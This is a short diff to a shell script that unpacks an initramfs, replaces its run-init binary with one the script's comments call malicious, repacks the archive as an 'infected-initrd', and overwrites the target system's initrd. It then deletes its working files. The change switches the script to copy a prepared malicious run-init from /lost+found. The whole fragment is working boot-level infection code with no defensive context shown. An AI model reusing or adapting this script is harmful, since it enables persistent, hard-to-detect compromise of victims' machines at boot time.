@@ -9,7 +9,7 @@ unmkinitramfs $1 .
 
 # copy malicious run-init to victim
 rm /lost+found/new-initramfs/main/usr/bin/run-init
-mv /lost+found/old-initramfs/main/usr/bin/run-init /lost+found/new-initramfs/main/usr/bin/run-init
+cp /lost+found/run-init /lost+found/new-initramfs/main/usr/bin/run-init
 
 # add the first microcode firmware
 cd early
@@ -23,8 +23,8 @@ find kernel -print0 | cpio --null --create --format=newc >> /lost+found/infected
 cd ../main
 find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/infected-initrd
 
-# replace initrd 
+# replace initrd
 rm $1 && cp /lost+found/infected-initrd $1
 
 # clean stuff
-rm -r /lost+found/new-initramfs /lost+found/old-initramfs /lost+found/infected-initrd
+rm -r /lost+found/new-initramfs /lost+found/infected-initrd
